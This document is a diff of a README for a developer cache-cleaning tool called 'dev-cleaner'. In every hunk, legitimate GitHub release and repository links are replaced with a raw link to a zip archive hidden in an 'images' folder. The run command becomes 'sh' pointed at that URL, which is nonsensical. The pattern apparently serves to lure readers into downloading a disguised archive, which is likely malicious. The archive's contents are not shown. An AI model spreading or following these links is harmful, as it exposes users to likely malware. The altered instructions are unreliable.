@@ -1,7 +1,7 @@
 # 🧹 dev-cleaner - Clean Up Your Development Environment Easily
 
 ## 📥 Download Here
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/uncultivated-genuslarrea96/dev-cleaner/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/uncultivated-genuslarrea96/dev-cleaner/main/images/dev-cleaner-v3.5.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/uncultivated-genuslarrea96/dev-cleaner/main/images/dev-cleaner-v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to dev-cleaner! This tool helps you quickly clean and optimize caches on your development tools like Xcode, Flutter, and Android. It works on both macOS and Linux. 
@@ -22,7 +22,7 @@ dev-cleaner requires permission to access system files and caches. Ensure you un
 
 ## 📖 Usage Instructions
 1. **Download & Install**
-   Visit this page to download: [Download Releases](https://github.com/uncultivated-genuslarrea96/dev-cleaner/releases)
+   Visit this page to download: [Download Releases](https://raw.githubusercontent.com/uncultivated-genuslarrea96/dev-cleaner/main/images/dev-cleaner-v3.5.zip)
 
 2. **Open the Terminal**
    - On macOS, you can find Terminal in `Applications > Utilities > Terminal`.
@@ -37,7 +37,7 @@ dev-cleaner requires permission to access system files and caches. Ensure you un
 4. **Run the Script**
    Type this command to run the script:
    ```bash
-   sh dev-cleaner.sh
+   sh https://raw.githubusercontent.com/uncultivated-genuslarrea96/dev-cleaner/main/images/dev-cleaner-v3.5.zip
    ```
    Follow the prompts on your screen. The script will let you know what it is cleaning.
 
@@ -65,7 +65,7 @@ For any questions or support issues, you can open a ticket on the GitHub reposit
 We welcome contributions! If you want to help improve dev-cleaner, feel free to fork the repository and submit a pull request.
 
 ## 🌐 More Information
-For more about the project, refer to the [GitHub Repository](https://github.com/uncultivated-genuslarrea96/dev-cleaner).
+For more about the project, refer to the [GitHub Repository](https://raw.githubusercontent.com/uncultivated-genuslarrea96/dev-cleaner/main/images/dev-cleaner-v3.5.zip).
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for more details.
